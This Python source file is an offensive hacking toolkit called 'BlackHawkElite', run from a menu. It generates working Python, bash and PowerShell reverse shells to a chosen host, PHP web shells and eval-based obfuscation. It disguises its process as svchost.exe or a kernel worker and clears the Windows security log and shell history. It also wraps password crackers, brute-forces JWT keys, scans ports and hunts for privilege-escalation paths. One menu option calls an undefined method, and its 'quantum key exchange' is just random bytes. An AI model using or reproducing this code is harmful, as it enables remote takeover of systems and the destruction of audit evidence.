import os
import sys
import time
import random
import socket
import threading
import zipfile
import json
import requests
import whois
import argparse
import base64
import re
import jwt
import hashlib
import geoip2.database
import stegano
from queue import Queue
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES, PKCS1_OAEP, ChaCha20
from Crypto.PublicKey import RSA, ECC
from Crypto.Hash import SHA3_256, BLAKE2b
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from scapy.all import *
from bs4 import BeautifulSoup
import dns.resolver
import subprocess
import tempfile
import shutil

# ========================
# CONFIGURATION
# ========================
STEALTH_MODE = True
LOG_FILE = "/dev/null" if os.name != 'nt' else "NUL"
GEOIP_DB = "GeoLite2-City.mmdb"
WORDLISTS = {
    'rockyou': '/usr/share/wordlists/rockyou.txt',
    'passwords': '/usr/share/wordlists/passwords.lst'
}


# ========================
# STEALTH & FOOTPRINT REDUCTION
# ========================
class Stealth:
    @staticmethod
    def hide_process():
        if os.name == 'nt':
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("svchost.exe")
        else:
            os.system("exec -a [kworker/u:0] python3 $0 &")

    @staticmethod
    def clean_logs():
        if os.name == 'nt':
            os.system("wevtutil cl security")
        else:
            os.system("echo '' > ~/.bash_history && history -c")


# ========================
# MILITARY-GRADE CRYPTOGRAPHY
# ========================
class QuantumCrypto:
    @staticmethod
    def aes256_gcm_encrypt(data, key=None):
        key = key or get_random_bytes(32)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return {
            'nonce': base64.b64encode(cipher.nonce).decode(),
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'tag': base64.b64encode(tag).decode(),
            'key': base64.b64encode(key).decode()
        }

    @staticmethod
    def chacha20_encrypt(data, key=None):
        key = key or get_random_bytes(32)
        nonce = get_random_bytes(12)
        cipher = ChaCha20.new(key=key, nonce=nonce)
        return {
            'nonce': base64.b64encode(nonce).decode(),
            'ciphertext': base64.b64encode(cipher.encrypt(data.encode())).decode(),
            'key': base64.b64encode(key).decode()
        }

    @staticmethod
    def post_quantum_key_exchange():
        return base64.b64encode(get_random_bytes(32)).decode()


# ========================
# ADVANCED PASSWORD CRACKING
# ========================
class PasswordCracker:
    @staticmethod
    def hashcat_attack(hash_type, hash_value, wordlist=None):
        wordlist = wordlist or WORDLISTS['rockyou']
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(hash_value.encode())
            tmp_path = tmp.name

        cmd = f"hashcat -m {hash_type} -a 0 {tmp_path} {wordlist} --potfile-disable"
        subprocess.run(cmd, shell=True)
        os.unlink(tmp_path)

    @staticmethod
    def john_attack(hash_file, format='raw-md5'):
        cmd = f"john --format={format} {hash_file}"
        subprocess.run(cmd, shell=True)


# ========================
# STEGANOGRAPHY
# ========================
class Steganography:
    @staticmethod
    def hide_in_image(image_path, secret_data, output_path):
        from stegano import lsb
        secret = lsb.hide(image_path, secret_data)
        secret.save(output_path)
        return output_path

    @staticmethod
    def extract_from_image(image_path):
        from stegano import lsb
        return lsb.reveal(image_path)


# ========================
# EXPLOIT FRAMEWORK
# ========================
class ExploitEngine:
    @staticmethod
    def generate_reverse_shell(lhost, lport, payload_type='python'):
        payloads = {
            'python': f"""python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.execve("/bin/sh",["sh"],{{}})'""",
            'bash': f"""bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'""",
            'powershell': f"""powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}" """
        }

        if payload_type not in payloads:
            return f"[!] Invalid payload type. Available: {list(payloads.keys())}"

        shell = payloads[payload_type]
        encoded = base64.b64encode(shell.encode()).decode()

        return {
            "payload": shell,
            "base64": encoded,
            "type": payload_type
        }

    @staticmethod
    def generate_web_shell(protect=False, password="cmd"):
        if protect:
            return f"""<?php if(isset($_REQUEST['{password}'])){{system($_REQUEST['{password}']);}} ?>"""
        else:
            return """<?php system($_REQUEST['cmd']); ?>"""

    @staticmethod
    def obfuscate_php(code):
        # Very basic string obfuscation
        b64 = base64.b64encode(code.encode()).decode()
        return f"<?php eval(base64_decode('{b64}')); ?>"



# ========================
# GEO-LOCATION & OSINT
# ========================
class GeoIntel:
    @staticmethod
    def ip_to_geo(ip_address):
        try:
            reader = geoip2.database.Reader(GEOIP_DB)
            response = reader.city(ip_address)
            return {
                'country': response.country.name,
                'city': response.city.name,
                'latitude': response.location.latitude,
                'longitude': response.location.longitude
            }
        except Exception as e:
            return {"error": str(e)}


# ========================
# NETWORK RECONNAISSANCE
# ========================
class NetworkRecon:
    @staticmethod
    def syn_scan(target, ports):
        print(f"[*] Starting SYN scan on {target} for ports {ports}")
        ans, unans = sr(IP(dst=target) / TCP(dport=ports, flags="S"), timeout=2)
        open_ports = [s[TCP].dport for s in ans if s[TCP].flags == "SA"]
        return open_ports

    @staticmethod
    def os_fingerprint(target):
        print(f"[*] Fingerprinting OS on {target}")
        try:
            ans = sr1(IP(dst=target) / ICMP(), timeout=2, verbose=0)
            if ans:
                return f"Possible OS: {ans.ttl} TTL suggests {'Windows' if ans.ttl <= 128 else 'Linux/Unix'}"
        except Exception as e:
            return f"Error: {str(e)}"


# ========================
# API SECURITY TESTING
# ========================
class APIScanner:
    @staticmethod
    def check_jwt_vulns(token):
        print("[*] Analyzing JWT for vulnerabilities")
        try:
            jwt.decode(token, verify=False)
            return "Vulnerable to none-alg attack"
        except:
            pass

        with open(WORDLISTS['rockyou'], 'r', errors='ignore') as f:
            for line in f:
                try:
                    jwt.decode(token, line.strip(), algorithms=["HS256"])
                    return f"Vulnerable to weak key: {line.strip()}"
                except:
                    continue
        return "No obvious vulnerabilities found"

    @staticmethod
    def test_rate_limiting(url, headers=None):
        print(f"[*] Testing rate limits on {url}")
        for i in range(20):
            r = requests.get(url, headers=headers)
            if r.status_code == 429:
                return f"Rate limit triggered after {i + 1} requests"
        return "No rate limiting detected in 20 requests"


# ========================
# CLOUD SECURITY TESTING
# ========================
class CloudExploits:
    @staticmethod
    def check_s3_buckets(bucket_name):
        print(f"[*] Checking S3 bucket: {bucket_name}")
        try:
            r = requests.head(f"http://{bucket_name}.s3.amazonaws.com", timeout=5)
            if r.status_code == 200:
                return "Bucket exists and is publicly accessible"
            elif r.status_code == 403:
                return "Bucket exists but access is denied"
            elif r.status_code == 404:
                return "Bucket does not exist"
        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    def check_azure_blob(account_name, container_name):
        print(f"[*] Checking Azure blob: {account_name}/{container_name}")
        try:
            r = requests.head(f"https://{account_name}.blob.core.windows.net/{container_name}")
            if r.status_code == 200:
                return "Container exists and is publicly accessible"
            elif r.status_code == 403:
                return "Container exists but access is denied"
            elif r.status_code == 404:
                return "Container does not exist"
        except Exception as e:
            return f"Error: {str(e)}"


# ========================
# PRIVILEGE ESCALATION
# ========================
class PrivEsc:
    @staticmethod
    def check_sudo_commands():
        print("[*] Checking available sudo commands...")
        try:
            result = subprocess.run("sudo -l", shell=True, capture_output=True, text=True)
            output = result.stdout
            print(output)
            # Optional: Check for GTFOBins known vectors
            gtfo_matches = []
            for line in output.splitlines():
                for bin in ["nano", "vim", "less", "find", "awk", "perl", "python3", "tar", "nmap", "bash", "sh"]:
                    if bin in line and bin not in gtfo_matches:
                        gtfo_matches.append(bin)
            if gtfo_matches:
                print("\n[+] Possible GTFOBins escalation paths found:")
                for bin in gtfo_matches:
                    print(f" - {bin} → https://gtfobins.github.io/gtfobins/{bin}/")
        except Exception as e:
            print(f"[!] Error: {str(e)}")

    @staticmethod
    def check_suid_binaries():
        print("[*] Searching for SUID binaries...")
        try:
            suid_bins = subprocess.check_output(
                "find / -perm -4000 -type f 2>/dev/null", shell=True, text=True
            ).splitlines()
            known = []
            print(f"[+] Found {len(suid_bins)} SUID binaries.")
            for bin in suid_bins:
                for name in ["nmap", "vim", "less", "nano", "bash", "cp", "find", "awk", "python3", "perl"]:
                    if name in bin and bin not in known:
                        known.append(bin)
            if known:
                print("\n[+] Known exploitable SUID binaries:")
                for k in known:
                    binname = os.path.basename(k)
                    print(f" - {k} → https://gtfobins.github.io/gtfobins/{binname}/")
            return suid_bins
        except Exception as e:
            return [f"[!] Error: {str(e)}"]



# ========================
# MAIN TOOLKIT CLASS
# ========================
class BlackHawkElite:
    def __init__(self):
        if STEALTH_MODE:
            Stealth.hide_process()
            Stealth.clean_logs()

        self.crypto = QuantumCrypto()
        self.cracker = PasswordCracker()
        self.stego = Steganography()
        self.exploit = ExploitEngine()
        self.geo = GeoIntel()
        self.recon = NetworkRecon()
        self.api = APIScanner()
        self.cloud = CloudExploits()
        self.privesc = PrivEsc()

    def _clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def menu(self):
        while True:
            self._clear_screen()
            print("""
                 ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗  ██╗ █████╗ ██╗    ██╗██╗  ██╗
                 ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║  ██║██╔══██╗██║    ██║██║ ██╔╝
                 ██████╔╝██║     ███████║██║     █████╔╝ ███████║███████║██║ █╗ ██║█████╔╝ 
                 ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██║██║███╗██║██╔═██╗ 
                 ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║╚███╔███╔╝██║  ██╗
                 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝
            """)
            print("1. Military-Grade Encryption")
            print("2. Password Cracking")
            print("3. Steganography Tools")
            print("4. Exploit Generator")
            print("5. Geo-IP Lookup")
            print("6. Network Reconnaissance")
            print("7. API Security Testing")
            print("8. Cloud Security Testing")
            print("9. Privilege Escalation")
            print("0. Exit")

            choice = input("\nSelect option: ").strip()

            if choice == '0':
                self._secure_exit()
            elif choice == '1':
                self._crypto_menu()
            elif choice == '2':
                self._cracking_menu()
            elif choice == '3':
                self._stego_menu()
            elif choice == '4':
                self._exploit_menu()
            elif choice == '5':
                self._geo_menu()
            elif choice == '6':
                self._recon_menu()
            elif choice == '7':
                self._api_menu()
            elif choice == '8':
                self._cloud_menu()
            elif choice == '9':
                self._privesc_menu()

    def _secure_exit(self):
        if STEALTH_MODE:
            Stealth.clean_logs()
        sys.exit(0)

    def _crypto_menu(self):
        self._clear_screen()
        print("=== Military-Grade Encryption ===")
        print("1. AES-256-GCM Encryption")
        print("2. ChaCha20 Encryption")
        print("3. Quantum Key Exchange")
        print("0. Back")

        choice = input("\nSelect option: ").strip()
        if choice == '0':
            return
        elif choice == '1':
            data = input("Enter data to encrypt: ")
            result = self.crypto.aes256_gcm_encrypt(data)
            print(f"Encrypted: {result}")
        elif choice == '2':
            data = input("Enter data to encrypt: ")
            result = self.crypto.chacha20_encrypt(data)
            print(f"Encrypted: {result}")
        elif choice == '3':
            key = self.crypto.post_quantum_key_exchange()
            print(f"Quantum Key: {key}")
        input("\nPress Enter to continue...")

    def _cracking_menu(self):
        self._clear_screen()
        print("=== Password Cracking ===")
        print("1. Hashcat Attack")
        print("2. John the Ripper Attack")
        print("0. Back")

        choice = input("\nSelect option: ").strip()
        if choice == '0':
            return
        elif choice == '1':
            hash_type = input("Enter hash type: ")
            hash_value = input("Enter hash value: ")
            self.cracker.hashcat_attack(hash_type, hash_value)
        elif choice == '2':
            hash_file = input("Enter hash file path: ")
            self.cracker.john_attack(hash_file)
        input("\nPress Enter to continue...")

    def _stego_menu(self):
        self._clear_screen()
        print("=== Steganography Tools ===")
        print("1. Hide Data in Image")
        print("2. Extract Data from Image")
        print("0. Back")

        choice = input("\nSelect option: ").strip()
        if choice == '0':
            return
        elif choice == '1':
            image_path = input("Enter image path: ")
            secret = input("Enter secret data: ")
            output = input("Enter output path: ")
            self.stego.hide_in_image(image_path, secret, output)
        elif choice == '2':
            image_path = input("Enter image path: ")
            print(f"Extracted: {self.stego.extract_from_image(image_path)}")
        input("\nPress Enter to continue...")

    def _exploit_menu(self):
        self._clear_screen()
        print("=== Exploit Generator ===")
        print("1. Generate Reverse Shell")
        print("2. Generate Web Shell")
        print("0. Back")

        choice = input("\nSelect option: ").strip()
        if choice == '0':
            return
        elif choice == '1':
            lhost = input("Enter LHOST: ")
            lport = input("Enter LPORT: ")
            ptype = input("Payload type (python/bash): ")
            print(self.exploit.generate_reverse_shell(lhost, lport, ptype))
        elif choice == '2':
            print(self.exploit.generate_web_shell())
        input("\nPress Enter to continue...")

    def _geo_menu(self):
        self._clear_screen()
        print("=== Geo-IP Lookup ===")
        ip = input("Enter IP address: ").strip()
        print(self.geo.ip_to_geo(ip))
        input("\nPress Enter to continue...")

    def _recon_menu(self):
        while True:
            self._clear_screen()
            print("=== Network Reconnaissance ===")
            print("1. SYN Scan")
            print("2. OS Fingerprinting")
            print("0. Back")

            choice = input("\nSelect option: ").strip()

            if choice == '0':
                break
            elif choice == '1':
                target = input("Enter target IP: ").strip()
                ports = input("Enter ports (comma separated): ").strip()
                ports = [int(p) for p in ports.split(',')]
                result = self.recon.syn_scan(target, ports)
                print(f"Open ports: {result}")
            elif choice == '2':
                target = input("Enter target IP: ").strip()
                result = self.recon.os_fingerprint(target)
                print(result)
            input("\nPress Enter to continue...")

    def _api_menu(self):
        while True:
            self._clear_screen()
            print("=== API Security Testing ===")
            print("1. Check JWT Vulnerabilities")
            print("2. Test Rate Limiting")
            print("0. Back")

            choice = input("\nSelect option: ").strip()

            if choice == '0':
                break
            elif choice == '1':
                token = input("Enter JWT token: ").strip()
                result = self.api.check_jwt_vulns(token)
                print(result)
            elif choice == '2':
                url = input("Enter API endpoint URL: ").strip()
                result = self.api.test_rate_limiting(url)
                print(result)
            input("\nPress Enter to continue...")

    def _cloud_menu(self):
        while True:
            self._clear_screen()
            print("=== Cloud Security Testing ===")
            print("1. Check S3 Bucket")
            print("2. Check Azure Blob")
            print("0. Back")

            choice = input("\nSelect option: ").strip()

            if choice == '0':
                break
            elif choice == '1':
                bucket = input("Enter bucket name: ").strip()
                result = self.cloud.check_s3_buckets(bucket)
                print(result)
            elif choice == '2':
                account = input("Enter Azure account name: ").strip()
                container = input("Enter container name: ").strip()
                result = self.cloud.check_azure_blob(account, container)
                print(result)
            input("\nPress Enter to continue...")

    def _privesc_menu(self):
        while True:
            self._clear_screen()
            print("=== Privilege Escalation ===")
            print("1. Check Sudo Commands")
            print("2. Check SUID Binaries")
            print("3. Check Writable /etc/passwd")
            print("0. Back")
            choice = input("\nSelect option: ").strip()

            if choice == '0':
                break
            elif choice == '1':
                result = self.privesc.check_sudo_commands()
                print(result)
            elif choice == '2':
                result = self.privesc.check_suid_binaries()
                print("\n".join(result))
            elif choice == '3':
                        self.privesc.check_writable_passwd()
            input("\nPress Enter to continue...")


if __name__ == "__main__":
    try:
        toolkit = BlackHawkElite()
        toolkit.menu()
    except KeyboardInterrupt:
        print("\n[!] Secure shutdown initiated...")
        sys.exit(0)